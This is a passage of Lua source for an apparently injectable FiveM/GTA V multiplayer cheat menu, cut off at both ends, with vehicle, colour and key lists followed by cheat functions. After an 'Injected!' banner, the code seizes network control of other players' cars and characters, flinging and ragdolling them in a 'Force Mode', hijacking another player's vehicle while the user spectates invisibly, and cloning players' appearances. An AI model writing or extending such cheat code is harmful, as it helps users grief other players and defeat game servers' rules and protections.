    "SWIFT",
    "SWIFT2",
    "VALKYRIE",
    "VALKYRIE2",
    "VOLATUS"
}

local planes = {
    "ALPHAZ1",
    "AVENGER",
    "AVENGER2",
    "BESRA",
    "BLIMP",
    "BLIMP2",
    "BLIMP3",
    "BOMBUSHKA",
    "CARGOPLANE",
    "CUBAN800",
    "DODO",
    "DUSTER",
    "HOWARD",
    "HYDRA",
    "JET",
    "LAZER",
    "LUXOR",
    "LUXOR2",
    "MAMMATUS",
    "MICROLIGHT",
    "MILJET",
    "MOGUL",
    "MOLOTOK",
    "NIMBUS",
    "NOKOTA",
    "PYRO",
    "ROGUE",
    "SEABREEZE",
    "SHAMAL",
    "STARLING",
    "STRIKEFORCE",
    "STUNT",
    "TITAN",
    "TULA",
    "VELUM",
    "VELUM2",
    "VESTRA",
    "VOLATOL"
}

local service = {
    "AIRBUS",
    "BRICKADE",
    "BUS",
    "COACH",
    "PBUS2",
    "RALLYTRUCK",
    "RENTALBUS",
    "TAXI",
    "TOURBUS",
    "TRASH",
    "TRASH2",
    "WASTELANDER",
    "AMBULANCE",
    "FBI",
    "FBI2",
    "FIRETRUK",
    "LGUARD",
    "PBUS",
    "POLICE",
    "POLICE2",
    "POLICE3",
    "POLICE4",
    "POLICEB",
    "POLICEOLD1",
    "POLICEOLD2",
    "POLICET",
    "POLMAV",
    "PRANGER",
    "PREDATOR",
    "RIOT",
    "RIOT2",
    "SHERIFF",
    "SHERIFF2",
    "APC",
    "BARRACKS",
    "BARRACKS2",
    "BARRACKS3",
    "BARRAGE",
    "CHERNOBOG",
    "CRUSADER",
    "HALFTRACK",
    "KHANJALI",
    "RHINO",
    "SCARAB",
    "SCARAB2",
    "SCARAB3",
    "THRUSTER",
    "TRAILERSMALL2"
}

local commercial = {
    "BENSON",
    "BIFF",
    "CERBERUS",
    "CERBERUS2",
    "CERBERUS3",
    "HAULER",
    "HAULER2",
    "MULE",
    "MULE2",
    "MULE3",
    "MULE4",
    "PACKER",
    "PHANTOM",
    "PHANTOM2",
    "PHANTOM3",
    "POUNDER",
    "POUNDER2",
    "STOCKADE",
    "STOCKADE3",
    "TERBYTE",
    "CABLECAR",
    "FREIGHT",
    "FREIGHTCAR",
    "FREIGHTCONT1",
    "FREIGHTCONT2",
    "FREIGHTGRAIN",
    "METROTRAIN",
    "TANKERCAR"
}

-- END VEHICLES LISTS
-- VEHICLE MODS LIST (this is going to take a while...)
local classicColors = {
    {"Black", 0},
    {"Carbon Black", 147},
    {"Graphite", 1},
    {"Anhracite Black", 11},
    {"Black Steel", 2},
    {"Dark Steel", 3},
    {"Silver", 4},
    {"Bluish Silver", 5},
    {"Rolled Steel", 6},
    {"Shadow Silver", 7},
    {"Stone Silver", 8},
    {"Midnight Silver", 9},
    {"Cast Iron Silver", 10},
    {"Red", 27},
    {"Torino Red", 28},
    {"Formula Red", 29},
    {"Lava Red", 150},
    {"Blaze Red", 30},
    {"Grace Red", 31},
    {"Garnet Red", 32},
    {"Sunset Red", 33},
    {"Cabernet Red", 34},
    {"Wine Red", 143},
    {"Candy Red", 35},
    {"Hot Pink", 135},
    {"Pfsiter Pink", 137},
    {"Salmon Pink", 136},
    {"Sunrise Orange", 36},
    {"Orange", 38},
    {"Bright Orange", 138},
    {"Gold", 99},
    {"Bronze", 90},
    {"Yellow", 88},
    {"Race Yellow", 89},
    {"Dew Yellow", 91},
    {"Dark Green", 49},
    {"Racing Green", 50},
    {"Sea Green", 51},
    {"Olive Green", 52},
    {"Bright Green", 53},
    {"Gasoline Green", 54},
    {"Lime Green", 92},
    {"Midnight Blue", 141},
    {"Galaxy Blue", 61},
    {"Dark Blue", 62},
    {"Saxon Blue", 63},
    {"Blue", 64},
    {"Mariner Blue", 65},
    {"Harbor Blue", 66},
    {"Diamond Blue", 67},
    {"Surf Blue", 68},
    {"Nautical Blue", 69},
    {"Racing Blue", 73},
    {"Ultra Blue", 70},
    {"Light Blue", 74},
    {"Chocolate Brown", 96},
    {"Bison Brown", 101},
    {"Creeen Brown", 95},
    {"Feltzer Brown", 94},
    {"Maple Brown", 97},
    {"Beechwood Brown", 103},
    {"Sienna Brown", 104},
    {"Saddle Brown", 98},
    {"Moss Brown", 100},
    {"Woodbeech Brown", 102},
    {"Straw Brown", 99},
    {"Sandy Brown", 105},
    {"Bleached Brown", 106},
    {"Schafter Purple", 71},
    {"Spinnaker Purple", 72},
    {"Midnight Purple", 142},
    {"Bright Purple", 145},
    {"Cream", 107},
    {"Ice White", 111},
    {"Frost White", 112}
}

local matteColors = {
    {"Black", 12},
    {"Gray", 13},
    {"Light Gray", 14},
    {"Ice White", 131},
    {"Blue", 83},
    {"Dark Blue", 82},
    {"Midnight Blue", 84},
    {"Midnight Purple", 149},
    {"Schafter Purple", 148},
    {"Red", 39},
    {"Dark Red", 40},
    {"Orange", 41},
    {"Yellow", 42},
    {"Lime Green", 55},
    {"Green", 128},
    {"Forest Green", 151},
    {"Foliage Green", 155},
    {"Olive Darb", 152},
    {"Dark Earth", 153},
    {"Desert Tan", 154}
}

local metalColors = {
    {"Brushed Steel", 117},
    {"Brushed Black Steel", 118},
    {"Brushed Aluminum", 119},
    {"Chrome", 120},
    {"Pure Gold", 158},
    {"Brushed Gold", 159}
}


local Keys = {
    ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, ["F11"] = 344, 
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
    ["NENTER"] = 201, ["N4"] = 124, ["N5"] = 126, ["N6"] = 125, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
    ["MOUSE1"] = 24
}
local Enable_Nuke = false
local currentMenuX = 1
local selectedMenuX = 1
local currentMenuY = 1
local selectedMenuY = 1
local menuX = { 0.75, 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7 }
local menuY = { 0.1, 0.025, 0.2, 0.3 , 0.400, 0.425 }


local introInteger = 0

function InitializeIntro(scaleform, message, messagesmall)
    local scaleform = RequestScaleformMovie(scaleform)
    while not HasScaleformMovieLoaded(scaleform) do
        Citizen.Wait(1)
    end
    PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
    PushScaleformMovieFunctionParameterString(message)
    PushScaleformMovieFunctionParameterString(messagesmall)
    PopScaleformMovieFunctionVoid()
    PushScaleformMovieMethodParameterInt(5)
    return scaleform
end

if introInteger == 0 then
			Citizen.CreateThread(function()
			while introInteger < 300 do
			Citizen.Wait(2)
			introScaleform = InitializeIntro("mp_big_message_freemode", "~r~! W W B A Menu ~v~| ~g~Injected!", "Open With ~r~L ~g~or ~r~F10")
            DrawScaleformMovieFullscreen(introScaleform, 80, 80, 80, 255)
            introInteger = introInteger + 1
		end
	end)
end

vRP = Proxy.getInterface("vRP")


local function ForceMod()
    ForceTog = not ForceTog
    
    if ForceTog then
        
        Citizen.CreateThread(function()
            ShowInfo("Force Mode ~g~[ON] ~g~\n~s~Active Mode ---> KEY ~y~[E] ")
            
            local ForceKey = Keys["E"]
            local Force = 0.5
            local KeyPressed = false
            local KeyTimer = 0
            local KeyDelay = 15
            local ForceEnabled = false
            local StartPush = false
            
            function forcetick()
                
                if (KeyPressed) then
                    KeyTimer = KeyTimer + 1
                    if (KeyTimer >= KeyDelay) then
                        KeyTimer = 0
                        KeyPressed = false
                    end
                end
                
                
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
                    KeyPressed = true
                    ForceEnabled = true
                end
                
                if (StartPush) then
                    
                    StartPush = false
                    local pid = PlayerPedId()
                    local CamRot = GetGameplayCamRot(2)
                    
                    local force = 5
                    
                    local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
                    local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
                    local Fz = force * (CamRot.x * 0.2)
                    
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, false)
                        if IsEntityOnScreen(k) and k ~= PlayerVeh then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= pid then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                
                end
                
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
                    KeyPressed = true
                    StartPush = true
                    ForceEnabled = false
                end
                
                if (ForceEnabled) then
                    local pid = PlayerPedId()
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                    
                    DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, true)
                        if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                            RequestControlOnce(k)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                            RequestControlOnce(k)
                            SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                
                end
            
            end
            
            while ForceTog do forcetick()Wait(0) end
        end)
    else ShowInfo("Force Mode ~r~[OFF]") end

end

function GetSeatPedIsIn(ped)
    if not IsPedInAnyVehicle(ped, false) then return
    else
        veh = GetVehiclePedIsIn(ped)
        for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
            if GetPedInVehicleSeat(veh) then return i end
        end
    end
end

function GetCamDirFromScreenCenter()
    local pos = GetGameplayCamCoord()
    local world = ScreenToWorld(0, 0)
    local ret = SubVectors(world, pos)
    return ret
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

function ScreenToWorld(screenCoord)
    local camRot = GetGameplayCamRot(2)
    local camPos = GetGameplayCamCoord()
    
    local vect2x = 0.0
    local vect2y = 0.0
    local vect21y = 0.0
    local vect21x = 0.0
    local direction = RotationToDirection(camRot)
    local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)
    
    local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
    local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
    local radians = -(math.rad(camRot.y))
    
    vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
    vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))
    
    local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
    if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
    end
    
    local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
    if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
    end
    
    if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
    end
    
    local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
    local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
    return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

end

function WorldToScreenRel(worldCoords)
    local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
    if not check then
        return false
    end
    
    screenCoordsx = (x - 0.5) * 2.0
    screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end

function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end

function ApplyForce(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

function RequestControl(entity)
    Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
            tick = tick + 1
            Wait(0)
        end
        return tick <= 12
    end)
end

function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)
    
    ApplyForce(entity, targetPos)
end

-- END MENYOO/ENTITY FUNCTIONS
-- DRAWING FUNCTIONS
function ShowMPMessage(message, subtitle, ms)
    Citizen.CreateThread(function()
        Citizen.Wait(0)
        function Initialize(scaleform)
            local scaleform = RequestScaleformMovie(scaleform)
            while not HasScaleformMovieLoaded(scaleform) do
                Citizen.Wait(0)
            end
            PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
            PushScaleformMovieFunctionParameterString(message)
            PushScaleformMovieFunctionParameterString(subtitle)
            PopScaleformMovieFunctionVoid()
            Citizen.SetTimeout(6500, function()
                PushScaleformMovieFunction(scaleform, "SHARD_ANIM_OUT")
                PushScaleformMovieFunctionParameterInt(1)
                PushScaleformMovieFunctionParameterFloat(0.33)
                PopScaleformMovieFunctionVoid()
                Citizen.SetTimeout(3000, function()EndScaleformMovieMethod() end)
            end)
            return scaleform
        end
        
        scaleform = Initialize("mp_big_message_freemode")
        
        while true do
            Citizen.Wait(0)
            DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 150, 0)
        end
    end)
end

function ShowInfo(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, false)
end

function DrawTxt(text, x, y, scale, size)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(scale, size)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

function DrawText3D(x, y, z, text)
    local onScreen, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
    local px, py, pz = table.unpack(GetGameplayCamCoords())
    local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)
    
    local scale = (1 / dist) * 2
    local fov = (1 / GetGameplayCamFov()) * 100
    local scale = scale * fov
    
    if onScreen then
        SetTextScale(0.0 * scale, 0.55 * scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

local entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
        enum.destructor = nil
        enum.handle = nil
    end
}

local function GetHeadItems()
    local headItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 0)
    local faceItemsList = {}
    for i = 1, headItems do
        faceItemsList[i] = i
    end
	return faceItemsList
end

local function GetHeadTextures(faceID)
    local headTextures = GetNumberOfPedTextureVariations(PlayerPedId(), 0, faceID)
	local headTexturesList = {}
    for i = 1, headTextures do
        headTexturesList[i] = i
    end
	return headTexturesList
end

local function GetHairItems()
    local hairItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 2)
    local hairItemsList = {}
    for i = 1, hairItems do
        hairItemsList[i] = i
    end
    return hairItemsList
end

local function GetHairTextures(hairID)
    local hairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, hairID)
    local hairTextureList = {}
    for i = 1, hairTexture do
        hairTextureList[i] = i
    end
    return hairTextureList
end

local function GetMaskItems()
    local maskItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 1)
    local maskItemsList = {}
    for i = 1, maskItems do
        maskItemsList[i] = i
    end
	return maskItemsList
end

local function GetHatItems()
    local hatItems = GetNumberOfPedPropDrawableVariations(PlayerPedId(), 0)
    local hatItemsList = {}
    for i = 1, hatItems do
        hatItemsList[i] = i
    end
	return hatItemsList
end

local function GetHatTextures(hatID)
	local hatTextures = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, hatID)
	local hatTexturesList = {}
	for i = 1, hatTextures do
        hatTexturesList[i] = i
    end
	return hatTexturesList
end

local function ClonePed(target)
        local ped = GetPlayerPed(target)
        local me = PlayerPedId()

        hat = GetPedPropIndex(ped, 0)
        hat_texture = GetPedPropTextureIndex(ped, 0)

        glasses = GetPedPropIndex(ped, 1)
        glasses_texture = GetPedPropTextureIndex(ped, 1)

        ear = GetPedPropIndex(ped, 2)
        ear_texture = GetPedPropTextureIndex(ped, 2)

        watch = GetPedPropIndex(ped, 6)
        watch_texture = GetPedPropTextureIndex(ped, 6)

        wrist = GetPedPropIndex(ped, 7)
        wrist_texture = GetPedPropTextureIndex(ped, 7)

        head_drawable = GetPedDrawableVariation(ped, 0)
        head_palette = GetPedPaletteVariation(ped, 0)
        head_texture = GetPedTextureVariation(ped, 0)

        beard_drawable = GetPedDrawableVariation(ped, 1)
        beard_palette = GetPedPaletteVariation(ped, 1)
        beard_texture = GetPedTextureVariation(ped, 1)

        hair_drawable = GetPedDrawableVariation(ped, 2)
        hair_palette = GetPedPaletteVariation(ped, 2)
        hair_texture = GetPedTextureVariation(ped, 2)

        torso_drawable = GetPedDrawableVariation(ped, 3)
        torso_palette = GetPedPaletteVariation(ped, 3)
        torso_texture = GetPedTextureVariation(ped, 3)

        legs_drawable = GetPedDrawableVariation(ped, 4)
        legs_palette = GetPedPaletteVariation(ped, 4)
        legs_texture = GetPedTextureVariation(ped, 4)

        hands_drawable = GetPedDrawableVariation(ped, 5)
        hands_palette = GetPedPaletteVariation(ped, 5)
        hands_texture = GetPedTextureVariation(ped, 5)

        foot_drawable = GetPedDrawableVariation(ped, 6)
        foot_palette = GetPedPaletteVariation(ped, 6)
        foot_texture = GetPedTextureVariation(ped, 6)

        acc1_drawable = GetPedDrawableVariation(ped, 7)
        acc1_palette = GetPedPaletteVariation(ped, 7)
        acc1_texture = GetPedTextureVariation(ped, 7)

        acc2_drawable = GetPedDrawableVariation(ped, 8)
        acc2_palette = GetPedPaletteVariation(ped, 8)
        acc2_texture = GetPedTextureVariation(ped, 8)

        acc3_drawable = GetPedDrawableVariation(ped, 9)
        acc3_palette = GetPedPaletteVariation(ped, 9)
        acc3_texture = GetPedTextureVariation(ped, 9)

        mask_drawable = GetPedDrawableVariation(ped, 10)
        mask_palette = GetPedPaletteVariation(ped, 10)
        mask_texture = GetPedTextureVariation(ped, 10)

        aux_drawable = GetPedDrawableVariation(ped, 11)
        aux_palette = GetPedPaletteVariation(ped, 11)
        aux_texture = GetPedTextureVariation(ped, 11)

        SetPedPropIndex(me, 0, hat, hat_texture, 1)
        SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
        SetPedPropIndex(me, 2, ear, ear_texture, 1)
        SetPedPropIndex(me, 6, watch, watch_texture, 1)
        SetPedPropIndex(me, 7, wrist, wrist_texture, 1)

        SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
        SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
        SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
        SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
        SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
        SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
        SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
        SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
        SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
        SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
        SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
        SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
end


local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
    return coroutine.wrap(function()
        local iter, id = initFunc()
        if not id or id == 0 then
            disposeFunc(iter)
            return
        end
        
        local enum = {handle = iter, destructor = disposeFunc}
        setmetatable(enum, entityEnumerator)
        
        local next = true
        repeat
            coroutine.yield(id)
            next, id = moveFunc(iter)
        until not next
        
        enum.destructor, enum.handle = nil, nil
        disposeFunc(iter)
    end)
end

function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumeratePickups()
    return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
end

function table.contains(table, element)
    for _, value in pairs(table) do
        if value == element then
            return true
        end
    end
    return false
end

function table.removekey(array, element)
    for i = 1, #array do
        if array[i] == element then
            table.remove(array, i)
        end
    end
end

function AddVectors(vect1, vect2)
    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
end

function SubVectors(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end

function ScaleVector(vect, mult)
    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
end

function round(num, numDecimalPlaces)
    local mult = 10 ^ (numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
end

local function GetKeyboardInput(text)
	if not text then text = "Input" end
    DisplayOnscreenKeyboard(0, "", "", "", "", "", "", 30)
    while (UpdateOnscreenKeyboard() == 0) do
		DrawTxt(text, 0.32, 0.37, 0.0, 0.4)
        DisableAllControlActions(0)

        if IsDisabledControlPressed(0, Keys["ESC"]) then return "" end
        Wait(0)
    end
    if (GetOnscreenKeyboardResult()) then
        local result = GetOnscreenKeyboardResult()
        Wait(0)
        return result
    end
end

function SpectatePlayer(id)
    local player = GetPlayerPed(id)
    if Spectating then
        RequestCollisionAtCoord(GetEntityCoords(player))
        NetworkSetInSpectatorMode(true, player)
    else
        RequestCollisionAtCoord(GetEntityCoords(player))
        NetworkSetInSpectatorMode(false, player)
    end
end

local function k(l)
    local m = {}
    local n = GetGameTimer() / 200
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end

local function PossessVehicle(target)
    PossessingVeh = not PossessingVeh
    
    if not PossessingVeh then
        SetEntityVisible(PlayerPedId(), true, 0)
        SetEntityCoords(PlayerPedId(), oldPlayerPos)
        SetEntityCollision(PlayerPedId(), true, 1)
    else
        SpectatePlayer(selectedPlayer)
        ShowInfo("~b~Checking Player...")
        Wait(3000)
        if IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
            SpectatePlayer(selectedPlayer)
            oldPlayerPos = GetEntityCoords(PlayerPedId())
            SetEntityVisible(PlayerPedId(), false, 0)
            SetEntityCollision(PlayerPedId(), false, 0)
        else
            SpectatePlayer(selectedPlayer)
            PossessingVeh = false
            ShowInfo("~r~Player not in a vehicle!  (Try again?)")
        end
        
        
        local Markerloc = nil
        

        Citizen.CreateThread(function()
            local ped = GetPlayerPed(target)
            local veh = GetVehiclePedIsIn(ped, 0)
            
            while PossessingVeh do
                
                DrawTxt("~b~Possessing " .. GetPlayerName(target) .. "'s ~b~Vehicle", 0.1, 0.05, 0.0, 0.4)
                DrawTxt("~b~Controls:\n-------------------", 0.1, 0.2, 0.0, 0.4)
                DrawTxt("~b~W/S: Forward/Back\n~b~SPACEBAR: Up\n~b~CTRL: Down\n~b~X: Cancel", 0.1, 0.25, 0.0, 0.4)
                Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 0, 180, 35, false, true, 2, nil, nil, false)
                
                local forward = SubVectors(Markerloc, GetEntityCoords(veh))
                local vpos = GetEntityCoords(veh)
                local vf = GetEntityForwardVector(veh)
                local vrel = SubVectors(vpos, vf)
                
                SetEntityCoords(PlayerPedId(), vrel.x, vrel.y, vpos.z + 1.1)
                SetEntityNoCollisionEntity(PlayerPedId(), veh, 1)
                
                RequestControlOnce(veh)
                
                if IsDisabledControlPressed(0, Keys["W"]) then
                    ApplyForce(veh, forward * 0.1)
                end
                
                if IsDisabledControlPressed(0, Keys["S"]) then
                    ApplyForce(veh, -(forward * 0.1))
                end
                
                if IsDisabledControlPressed(0, Keys["SPACE"]) then
                    ApplyForceToEntity(veh, 3, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                end
                
                if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then
                    ApplyForceToEntity(veh, 3, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                end
                
                if IsDisabledControlPressed(0, Keys["X"]) or GetEntityHealth(PlayerPedId()) < 5.0 then
                    PossessingVeh = false
                    SetEntityVisible(PlayerPedId(), true, 0)
                    SetEntityCoords(PlayerPedId(), oldPlayerPos)
                    SetEntityCollision(PlayerPedId(), true, 1)
                end
                
                Wait(0)
            end
        end)
    end
end

function GetWeaponNameFromHash(hash)
    for i = 1, #allweapons do
        if GetHashKey(allweapons[i]) == hash then
            return string.sub(allweapons[i], 8)
        end
    end
end

function TeleportToCoords()
    local x = GetKeyboardInput("Enter ~r~X ~s~Coordinates", "", 100)
    local y = GetKeyboardInput("Enter ~r~Y ~s~Coordinates", "", 100)
    local z = GetKeyboardInput("Enter ~r~Z ~s~Coordinates", "", 100)
    local entity
    if x ~= "" and y ~= "" and z ~= "" then
        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
        else
            entity = PlayerPedId()
        end
        if entity then
            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
        end
    else
        ShowInfo("~r~Invalid Coordinates!")
    end
end


local function fbi()
    local bB = 160.868
    local bC = -745.831
    local bD = 250.063
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function ls()
    local bB = -365.425
    local bC = -131.809
    local bD = 37.873
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
